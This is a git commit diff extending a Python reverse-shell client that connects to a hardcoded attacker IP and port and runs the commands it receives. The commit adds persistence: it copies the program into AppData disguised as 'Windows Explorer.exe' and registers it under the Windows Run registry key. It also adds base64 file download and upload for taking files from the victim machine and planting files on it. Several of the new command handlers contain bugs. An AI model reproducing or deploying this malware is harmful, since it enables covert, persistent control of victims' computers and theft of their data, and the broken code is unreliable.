5d95e25e72a08325f9f9b9a49fa974e341ec89de
Arnaud-devs <shemaarnaud69@gmail.com>
2025-02-15 09:32:21 -0500

    adding reading and writing function,used to download and upload file

--- client.py
+++ client.py
@@ -1,13 +1,32 @@
 import socket
 import subprocess
-import os
-
+import os, sys, base64
+import json
+import shutil
 class ReverseShell:
     def __init__(self, attacker_ip="192.168.31.135", attacker_port=4444):
         self.attacker_ip = attacker_ip
         self.attacker_port = attacker_port
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
 
+    def become_persistence(self):
+        evil_file_location = os.environ["appdata"]+"\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\currentVersion\\Run /v test REG_SZ /d "{evil_file_location}" /f', shell=True)
+    def read_file(self, path):
+        try:
+            with open(path,"rb") as file:
+                return base64.b64encode(file.read())
+        except FileNotFoundError:
+            return f"[-] file not found: {path}"
+    def write_file(self,path,content):
+        with open(path,'wb')as file:
+            file.write(base64.b64decode(content))
+        return "[+] Uploaded successfully"
+    
+            
     def connect(self):
         """Connects to the attacker's machine and waits for commands."""
         try:
@@ -29,6 +48,15 @@ class ReverseShell:
             if command.startswith("cd "):  # Handle 'cd' separately
                 os.chdir(command[3:])
                 return f"Changed directory to {os.getcwd()}\n"
+            elif command =="exit":
+                self.sock.connect()
+                sys.exit()
+            elif command.lower().startswith("download"):
+                 command.split()
+                 result = self.read_file(command[1])
+            elif command.lower().startswith("upload"):
+                 command.split()
+                 result = self.write_file(command[1])
             output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
         except subprocess.CalledProcessError as e:
             output = e.output
